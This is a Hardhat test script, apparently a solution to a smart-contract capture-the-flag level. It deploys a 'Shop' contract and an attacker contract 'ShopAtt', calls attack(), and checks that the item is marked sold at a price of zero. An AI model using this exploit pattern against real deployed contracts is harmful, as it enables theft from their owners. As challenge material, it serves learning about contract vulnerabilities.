// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    const signers = await hre.ethers.getSigners();
    Shop = await hre.ethers.getContractFactory("Shop");
    const target = await Shop.deploy();
    await target.deployed();

    expect(await target.isSold()).to.equal(false);

    ShopAtt = await hre.ethers.getContractFactory("ShopAtt");
    const att = await ShopAtt.deploy();
    await att.deployed();

    const tx = await att.attack(target.address);
    await tx.wait();

    expect(await target.isSold()).to.equal(true);
    expect((await target.price()).toNumber()).to.equal(0);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
